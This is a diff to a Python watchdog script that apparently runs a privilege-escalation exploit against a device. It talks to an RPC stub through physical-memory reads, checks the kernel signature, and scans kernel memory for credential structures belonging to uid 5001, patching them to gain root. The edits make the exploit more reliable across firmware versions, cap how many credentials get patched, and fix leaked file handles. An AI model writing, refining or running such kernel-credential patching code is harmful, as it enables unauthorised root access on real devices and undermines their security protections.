@@ -98,6 +98,10 @@ def ensure_server():
     subprocess.Popen([str(py), "server.py"], cwd=str(SERVER_DIR),
                      stdout=out, stderr=err,
                      creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+    # The child has its own handles now; keeping the parent's open leaked two fds
+    # on every restart of the watchdog.
+    out.close()
+    err.close()
     for _ in range(20):
         if port_open(80):
             log(f"server: started on :80 ({py.name})")
@@ -108,14 +112,24 @@ def ensure_server():
 
 
 def live_stub(timeout=4.0):
-    """An RPC whose stub answered a harmless read, else None."""
+    """An RPC whose stub answered a harmless read, else None.
+
+    Liveness is "it served a physical read", NOT "init_task is where this model
+    puts it": the old test compared the comm at the hardcoded INIT_P and RSET a
+    perfectly good stub on any other firmware (review finding, 2026-10-26).  The
+    kernel signature is logged when it differs, but does not decide.
+    """
     try:
         rpc = T.RPC(timeout=timeout, hello_timeout=timeout)
     except Exception:
         return None
     try:
         rpc.s.settimeout(timeout)
-        if rpc.read(INIT_P + 0x400, 8).startswith(b"swapper"):
+        sig = rpc.read(0x20008000, 8)
+        if sig == T.IMG_SIG:
+            return rpc
+        if sig:
+            log("stub alive; kernel signature at 0x20008000 differs: " + sig.hex())
             return rpc
     except Exception:
         pass
@@ -165,10 +179,17 @@ def root_by_tail(rpc):
     return "already" if saw_root else None
 
 
-def root_by_cred_scan(rpc):
-    """Content scan for owner creds; list-independent. Returns count patched."""
+def root_by_cred_scan(rpc, max_patch=8):
+    """Content scan for owner creds; list-independent. Returns count patched.
+
+    `max_patch` mirrors the payload's process-wide CredScanNear budget: patching
+    every uid-5001 cred on the box roots other apps as collateral, so the
+    fallback is capped instead of unbounded.
+    """
     patched = 0
     for cred in K.iter_owner_creds(rpc, SCAN_START, SCAN_STOP):
+        if patched >= max_patch:
+            break
         try:
             usage = T.u32(rpc.read(cred, 4))
         except Exception:
